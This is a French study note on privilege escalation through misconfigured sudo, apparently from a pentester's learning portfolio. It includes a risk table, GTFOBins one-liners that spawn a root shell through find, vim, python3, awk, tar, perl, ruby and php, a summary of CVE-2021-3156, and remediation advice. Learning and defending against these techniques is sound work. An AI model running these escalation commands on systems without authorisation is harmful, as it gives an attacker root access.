# Mauvaise configuration sudo

## Définition

Le fichier `/etc/sudoers` définit les commandes qu'un utilisateur peut exécuter
avec les droits d'un autre utilisateur (généralement root).
Une mauvaise configuration — souvent un `NOPASSWD` sur un binaire courant —
permet d'exécuter du code arbitraire avec les droits root.

---

## Énumération

```bash
# Vérifier ses droits sudo — première commande à lancer sur un système
sudo -l
```

Ce que chercher dans le retour :
- `(ALL : ALL) NOPASSWD: ALL` — shell root immédiat
- `NOPASSWD` + n'importe quel binaire scriptable — vérifier GTFOBins

---

## Configurations dangereuses

| Configuration sudoers | Risque | Priorité |
|---|---|---|
| `user ALL=(ALL) NOPASSWD: ALL` | Shell root sans mot de passe | Critique |
| `user ALL=(ALL) /usr/bin/vim` | Édition de fichiers système, shell via `:!bash` | Élevé |
| `user ALL=(ALL) /usr/bin/find` | Exécution de commandes via `-exec` | Élevé |
| `user ALL=(ALL) /usr/bin/python3` | Exécution de scripts Python en root | Élevé |
| `user ALL=(ALL) /usr/bin/less` | Lecture de fichiers root, shell via `!bash` | Moyen |
| `user ALL=(ALL) /usr/bin/tar` | Exécution via `--checkpoint-action` | Élevé |
| `user ALL=(ALL) /usr/bin/awk` | Shell via `system()` | Élevé |
| `user ALL=(ALL) /usr/bin/perl` | `exec "/bin/bash"` direct | Élevé |

---

## Exploitations classiques (GTFOBins)

Ces commandes permettent d'obtenir un shell root si le binaire est dans `sudo -l` avec `NOPASSWD`.
Référence complète : [gtfobins.github.io](https://gtfobins.github.io/) — section **Sudo**.

```bash
# find → -exec
sudo find . -exec /bin/bash \;

# vim → commande shell depuis l'éditeur
sudo vim -c ':!/bin/bash'

# python3 → os.system
sudo python3 -c 'import os; os.system("/bin/bash")'

# awk → system()
sudo awk 'BEGIN {system("/bin/bash")}'

# less → commande shell depuis le pager
sudo less /etc/passwd
# puis taper : !bash

# tar → checkpoint-action
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# perl → exec
sudo perl -e 'exec "/bin/bash";'

# ruby → exec
sudo ruby -e 'exec "/bin/bash"'

# php → system
sudo php -r 'system("/bin/bash");'
```

---

## sudoedit et CVE-2021-3156

Même sans `NOPASSWD`, une version vulnérable de sudo peut suffire.

**CVE-2021-3156** (Baron Samedit) — buffer overflow dans `sudoedit` permettant
à tout utilisateur local d'obtenir un shell root, sans droit sudo configuré.

| Élément | Détail |
|---|---|
| CVE | CVE-2021-3156 |
| Versions affectées | sudo < 1.9.5p2 |
| Vérification | `sudo --version` |
| Impact | PrivEsc locale vers root |
| Remédiation | `apt upgrade sudo` |

Rencontré en lab (pentest EvilCorp, VULN-05, CVSS 7.8) — voir le [rapport de pentest](https://github.com/Deagant/pentest-lab-report-portfolio).

---

## Remédiations

- Auditer `/etc/sudoers` avec `sudo -l` pour chaque compte utilisateur
- N'autoriser que les commandes strictement nécessaires, jamais `ALL`
- Éviter `NOPASSWD` — s'il est inévitable, documenter la raison
- Utiliser `visudo` pour éditer (validation syntaxique intégrée)
- Vérifier chaque binaire accordé sur GTFOBins avant autorisation
- Maintenir sudo à jour (CVE-2021-3156 et vulnérabilités analogues)

---

## Ce que j'ai appris

- `sudo -l` est la première commande à lancer après un accès initial — souvent la fin directe du chemin PrivEsc
- Des binaires courants (vim, find, python, tar) sont exploitables en quelques secondes avec GTFOBins
- Même une config sudo vide n'est pas suffisante si la version de sudo est vulnérable (CVE-2021-3156)
- Pourquoi tester `NOPASSWD` + GTFOBins doit être systématique avant de chercher des vecteurs plus complexes
